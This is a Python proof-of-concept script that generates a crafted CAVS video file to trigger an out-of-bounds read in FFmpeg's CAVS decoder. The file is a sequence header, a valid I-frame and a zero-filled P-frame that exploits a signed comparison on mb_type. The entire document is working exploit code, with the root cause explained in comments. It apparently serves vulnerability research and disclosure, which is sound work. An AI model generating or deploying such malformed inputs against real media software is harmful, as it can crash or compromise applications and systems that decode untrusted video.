#!/usr/bin/env python3
"""
PoC generator for VULN 001: P-frame mb_type signed comparison bypass
in FFmpeg CAVS decoder leading to OOB read in ff_cavs_partition_flags.

Root cause:
  In decode_pic() P-frame path (cavsdec.c ~line 1126):
    mb_type = get_ue_golomb(&h->gb) + P_SKIP + h->skip_mode_flag;
    if (mb_type > P_8X8) ...   <-- signed comparison
    else decode_mb_p(h, mb_type);

  If get_ue_golomb returns AVERROR_INVALIDDATA (-22) due to >=13 leading zeros,
  mb_type = -22 + P_SKIP(1) + skip_mode_flag(0) = -21.
  -21 > P_8X8(5) is FALSE (signed), so decode_mb_p(h, -21) is called.
  Inside, ff_cavs_inter(h, -21) accesses ff_cavs_partition_flags[-21] -> OOB.

Trigger: All-zero MB payload in P-frame causes get_ue_golomb to see 13+ leading
zeros, returning AVERROR_INVALIDDATA(-22).

Bitstream structure:
  1. Sequence header (0x000001B0)
  2. I-frame (0x000001B3) with minimal valid MB data (must succeed for DPB setup)
  3. P-frame (0x000001B6) with zero-filled MB payload (triggers vulnerability)
"""

import struct
import os

def bits_to_bytes(bit_list):
    """Pack a list of bits (0 or 1) into bytes, padding with zeros."""
    while len(bit_list) % 8 != 0:
        bit_list.append(0)
    result = bytearray()
    for i in range(0, len(bit_list), 8):
        byte_val = 0
        for j in range(8):
            byte_val = (byte_val << 1) | bit_list[i + j]
        result.append(byte_val)
    return bytes(result)

def make_seq_header():
    """
    Build the CAVS sequence header payload (after start code 0x000001B0).

    decode_seq_header() reads (in order):
      profile        : 8 bits  = 0x20 (JiZhun/Baseline profile - required)
      level          : 8 bits  = 0x20 (level)
      progressive_seq: 1 bit   = 1
      width          : 14 bits = 16
      height         : 14 bits = 16
      chroma_format  : 2 bits  = 1 (4:2:0) [skipped]
      sample_prec    : 3 bits  = 1 (8-bit) [skipped]
      aspect_ratio   : 4 bits  = 1 (square pixels)
      frame_rate_code: 4 bits  = 1 (24000/1001, must be 1-13)
      bit_rate_lower : 18 bits = 0 [skipped]
      marker_bit     : 1 bit   = 1 [skipped]
      bit_rate_upper : 12 bits = 0 [skipped]
      low_delay      : 1 bit   = 0 (non-low-delay)
    Total: 90 bits -> 12 bytes (padded to byte boundary)
    """
    bits = []

    # profile = 0x20 = 0b00100000
    for b in [0,0,1,0,0,0,0,0]:
        bits.append(b)

    # level = 0x20 = 0b00100000
    for b in [0,0,1,0,0,0,0,0]:
        bits.append(b)

    # progressive_sequence = 1
    bits.append(1)

    # width = 16 in 14 bits (MSB first): 00000000010000
    w = 16
    for i in range(13, -1, -1):
        bits.append((w >> i) & 1)

    # height = 16 in 14 bits (MSB first): 00000000010000
    h = 16
    for i in range(13, -1, -1):
        bits.append((h >> i) & 1)

    # chroma_format = 1 (4:2:0) in 2 bits: 01 [skipped by decoder]
    bits += [0, 1]

    # sample_precision = 1 (8-bit) in 3 bits: 001 [skipped]
    bits += [0, 0, 1]

    # aspect_ratio = 1 (square) in 4 bits: 0001
    bits += [0, 0, 0, 1]

    # frame_rate_code = 1 (24000/1001) in 4 bits: 0001
    bits += [0, 0, 0, 1]

    # bit_rate_lower = 0 in 18 bits [skipped]
    bits += [0] * 18

    # marker_bit = 1 [skipped]
    bits.append(1)

    # bit_rate_upper = 0 in 12 bits [skipped]
    bits += [0] * 12

    # low_delay = 0
    bits.append(0)

    # Total so far: 8+8+1+14+14+2+3+4+4+18+1+12+1 = 90 bits
    return bits_to_bytes(bits)


def make_iframe_payload():
    """
    Build the I-frame payload (after start code 0x000001B3).

    This must decode successfully so that DPB[0] gets a valid reference frame
    for the subsequent P-frame decode.

    decode_pic() for PIC_I_START_CODE reads:
      bbv_delay             : 16 bits [skipped]
      time_code_flag        : 1 bit  = 0 (no time code)
      -- stream_revision logic (show_bits without consuming) --
        With poc bit25=0, show_bits(9)&1=0 -> stream_revision=1
        -> skip_bits(1) for marker_bit
      poc                   : 8 bits  = 0
      progressive           : 1 bit   = 1
      top_field_first       : 1 bit   = 0
      repeat_first_field    : 1 bit   = 0
      qp_fixed              : 1 bit   = 1
      qp                    : 6 bits  = 32 (=0b100000)
      reserved (I-frame)    : 4 bits  [skipped]
      loop_filter_disable   : 1 bit   = 1 (disable)

    Then 1 macroblock (16x16 frame = 1x1 MB grid):
      luma pred mode 0  : 1 bit  = 1 (use predpred, no extra bits)
      luma pred mode 1  : 1 bit  = 1
      luma pred mode 2  : 1 bit  = 1
      luma pred mode 3  : 1 bit  = 1
      uv_pred_mode = 0  : UE-Golomb "1" = 1 bit
      cbp_code = 4      : UE-Golomb "00101" = 5 bits
        -> cbp_tab[4][0] = 0 (no luma residual)
        -> cbp_tab[4 or chroma check uses bits 4,5 of h->cbp = 0] (no chroma residual)
    """
    bits = []

    # bbv_delay = 0 (16 bits)
    bits += [0] * 16

    # time_code_flag = 0
    bits.append(0)

    # Bit 17: marker bit (will be skipped by stream_revision=1 path).
    # We need bit25=0 for the stream_revision condition.
    # Since poc=0, bits18..25 are all 0, so bit25=0. Condition holds.
    # The marker bit at position 17 can be 1 (it's skipped anyway).
    bits.append(1)  # marker at pos17 (skipped)

    # poc = 0 (8 bits at positions 18..25)
    # bit25 = 0 triggers stream_revision=1 which skips pos17 (already set)
    for i in range(13, -1, -1):
        pass  # won't use this loop
    bits += [0] * 8  # poc=0: bits 18..25 all zero

    # progressive = 1 (pos 26)
    bits.append(1)

    # top_field_first = 0 (pos 27)
    bits.append(0)

    # repeat_first_field = 0 (pos 28)
    bits.append(0)

    # qp_fixed = 1 (pos 29)
    bits.append(1)

    # qp = 32 = 0b100000 (6 bits, pos 30..35)
    qp = 32
    for i in range(5, -1, -1):
        bits.append((qp >> i) & 1)

    # For I-frame: skip reserved 4 bits (pos 36..39)
    # (I-frame path: !progressive && !pic_structure -> no; skip 4 reserved)
    bits += [0] * 4

    # loop_filter_disable = 1 (pos 40)
    bits.append(1)

    # --- Macroblock data (pos 41+) ---
    # 4 luma prediction modes: each is 1 bit = 1 (use predpred, no rem_mode)
    bits += [1, 1, 1, 1]

    # uv_pred_mode = 0: UE-Golomb("1") = single 1 bit
    bits.append(1)

    # cbp_code = 4: UE-Golomb("00101") = 5 bits
    # n=4: n+1=5=0b101, 2 leading zeros + "101"
    bits += [0, 0, 1, 0, 1]

    # h->cbp = cbp_tab[4][0] = 0 -> no luma residuals, no chroma residuals
    # Macroblock decode completes. ff_cavs_next_mb returns 0 (1x1 grid done).

    # Pad to full byte
    return bits_to_bytes(bits)


def make_pframe_payload():
    """
    Build the P-frame payload (after start code 0x000001B6).

    decode_pic() for PIC_PB_START_CODE reads:
      bbv_delay             : 16 bits [skipped]
      picture_coding_type   : 2 bits  = 01 (P-frame)
      -- DPB[0] check: must be non-null (set by I-frame) --
      poc                   : 8 bits  = 2
      progressive           : 1 bit   = 1
      top_field_first       : 1 bit   = 0
      repeat_first_field    : 1 bit   = 0
      qp_fixed              : 1 bit   = 1
      qp                    : 6 bits  = 32
      ref_flag              : 1 bit   = 0
      reserved              : 4 bits  [skipped]
      skip_mode_flag        : 1 bit   = 0 (no skip mode)
      loop_filter_disable   : 1 bit   = 1

    Then MB loop with skip_mode_flag=0:
      -> reads mb_type = get_ue_golomb() + P_SKIP(1) + 0
      -> all-zero payload -> get_ue_golomb returns AVERROR_INVALIDDATA(-22)
      -> mb_type = -22 + 1 = -21
      -> -21 > P_8X8(5) is FALSE (signed comparison bypass!)
      -> decode_mb_p(h, -21) is called
      -> ff_cavs_inter(h, -21) accesses ff_cavs_partition_flags[-21] -> OOB!
    """
    bits = []

    # bbv_delay = 0 (16 bits)
    bits += [0] * 16

    # picture_coding_type = 1 (P-frame) in 2 bits: 01
    # get_bits(2) + AV_PICTURE_TYPE_I(1) = 1 + 1 = 2 = AV_PICTURE_TYPE_P
    bits += [0, 1]

    # poc = 2 = 0b00000010 (8 bits)
    poc = 2
    for i in range(7, -1, -1):
        bits.append((poc >> i) & 1)

    # progressive = 1
    bits.append(1)

    # top_field_first = 0
    bits.append(0)

    # repeat_first_field = 0
    bits.append(0)

    # qp_fixed = 1
    bits.append(1)

    # qp = 32 = 0b100000 (6 bits)
    qp = 32
    for i in range(5, -1, -1):
        bits.append((qp >> i) & 1)

    # For P-frame: ref_flag (not B-frame)
    bits.append(0)  # ref_flag = 0

    # reserved 4 bits
    bits += [0] * 4

    # skip_mode_flag = 0 (no skip mode -> goes directly to mb_type read)
    bits.append(0)

    # loop_filter_disable = 1
    bits.append(1)

    # Pad header to byte boundary then fill with zeros for MB payload
    # (all zeros will cause get_ue_golomb to return AVERROR_INVALIDDATA)
    while len(bits) % 8 != 0:
        bits.append(0)

    header_bytes = bits_to_bytes(bits)

    # Append 64 zero bytes for MB payload
    # (ensures get_ue_golomb sees 13+ leading zeros -> returns -22)
    mb_payload = bytes(64)

    return header_bytes + mb_payload


def main():
    script_dir = os.path.dirname(os.path.abspath(__file__))
    output_path = os.path.join(script_dir, "vuln_001_input.cavs")

    # Start code prefix
    SC = b'\x00\x00\x01'

    seq_hdr  = SC + b'\xb0' + make_seq_header()
    iframe   = SC + b'\xb3' + make_iframe_payload()
    pframe   = SC + b'\xb6' + make_pframe_payload()

    bitstream = seq_hdr + iframe + pframe

    with open(output_path, 'wb') as f:
        f.write(bitstream)

    print(f"[+] Generated: {output_path} ({len(bitstream)} bytes)")
    print(f"    Seq header : {len(seq_hdr)} bytes")
    print(f"    I-frame    : {len(iframe)} bytes")
    print(f"    P-frame    : {len(pframe)} bytes")
    print()
    print("    P-frame trigger: zero-filled MB payload")
    print("    -> get_ue_golomb returns AVERROR_INVALIDDATA(-22)")
    print("    -> mb_type = -22 + P_SKIP(1) = -21")
    print("    -> signed check: -21 > P_8X8(5) = FALSE -> decode_mb_p(h, -21)")
    print("    -> ff_cavs_partition_flags[-21] = OOB read")

    # Print hex dump of the file
    print(f"\n    Hex dump ({len(bitstream)} bytes):")
    for i in range(0, len(bitstream), 16):
        chunk = bitstream[i:i+16]
        hex_str = ' '.join(f'{b:02x}' for b in chunk)
        print(f"    {i:04x}: {hex_str}")


if __name__ == '__main__':
    main()
